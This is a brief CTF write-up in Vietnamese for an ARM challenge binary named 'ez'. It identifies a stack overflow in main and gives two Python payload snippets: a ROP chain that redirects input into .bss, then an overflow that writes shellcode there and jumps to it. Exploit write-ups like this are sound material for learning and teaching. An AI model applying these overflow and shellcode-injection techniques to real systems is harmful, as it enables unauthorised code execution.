Đề cho ta file **ez** ARM</br>
![image](https://user-images.githubusercontent.com/23306492/40377949-5ffd91d4-5e1c-11e8-9387-96e85cce524d.png)</br>
disable toàn bộ</br>
![image](https://user-images.githubusercontent.com/23306492/40377995-7dfa49a2-5e1c-11e8-9bd7-c8fe8c856715.png)</br>
Hàm `main` ta thấy lỗi ở đây là stack overflow</br>
![image](https://user-images.githubusercontent.com/23306492/40378321-6b083c36-5e1d-11e8-8719-0709df31c667.png)
</br>
Với bài này ta cần ghi đè shellcode và jump về địa chỉ shellcode</br>
Trước tiên ta cần ROP để có thể input vào bss</br>
```
pop_r3_pc = 0x102f0
bss = 0x21028
main = 0x10421
payload = 'A'*20
payload += p32(bss)
payload += p32(pop_r3_pc)
payload += p32(bss)
payload += p32(main)
r.sendline(payload)
````
 Sau đó quay trở lại `mov  R1,R3`và input lại lần 2 để có thể jump đến shellcode_address</br>
![image](https://user-images.githubusercontent.com/23306492/40378386-966751e6-5e1d-11e8-873e-ce9ef22351b8.png)</br>
```
payload = 'A'*28
payload += p32(bss+0x20)
payload += shellcode
r.sendline(payload)
```
[payload](url)</br>
![image](https://user-images.githubusercontent.com/23306492/40378289-4eece8d0-5e1d-11e8-8cef-2e473f5e03f5.png)
